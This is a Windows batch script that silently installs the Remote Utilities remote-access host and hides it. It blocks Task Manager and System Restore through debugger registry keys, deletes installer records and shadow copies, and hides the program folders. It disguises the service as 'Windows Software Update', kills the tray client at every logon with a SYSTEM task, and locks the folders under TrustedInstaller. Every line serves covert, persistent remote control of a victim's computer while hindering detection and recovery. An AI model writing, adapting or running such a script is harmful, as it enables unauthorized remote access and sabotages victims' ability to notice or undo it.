@echo off
msiexec /i msi.msi /qn 

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t Reg_sz /d "C:\windows\taskmgr.exe" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe" /v Debugger /t Reg_sz /d "C:\windows\rstrui.exe" /f

TIMEOUT /T 10

reg delete HKEY_CLASSES_ROOT\Installer\Products\CF2BA4E1342B2C54FBA60A72121338DC /f
reg delete HKEY_CLASSES_ROOT\Installer\Products\B382549EC85704A48B1501660D4EE98A /f

attrib +s +h "C:\Program Files\Remote Utilities - Host"
attrib +s +h "C:\Program Files (x86)\Remote Utilities - Host"

rd /S /Q "C:\ProgramData\Remote Utilities" "C:\windows\installer" "C:\System Volume Information" "C:\Program Files (x86)\Remote Utilities - Host" "C:\Program Files\Remote Utilities - Host" 

sc config RManService displayname= "Windows Software Update" 
sc Description RManService "Microsoft Windows Software Update"   

Vssadmin delete shadows /all /quiet

schtasks /create /tn "Themes" /tr "taskkill /F /FI \"USERNAME eq %USERNAME%\" /IM rfusclient.exe" /sc onlogon /ru "SYSTEM" 
schtasks /run /TN "Themes" 

icacls "C:\Program Files\Remote Utilities - Host" /setowner "NT Service\TrustedInstaller"   
icacls "C:\Program Files\Remote Utilities - Host" /grant:r system:(RX,W) /inheritance:r

icacls "C:\Program Files (x86)\Remote Utilities - Host" /setowner "NT Service\TrustedInstaller"   
icacls "C:\Program Files (x86)\Remote Utilities - Host" /grant:r system:(RX,W) /inheritance:r

taskkill /F /FI "USERNAME eq %USERNAME%" /IM rfusclient.exe

rd /S /Q "%temp%\all" 

@exit

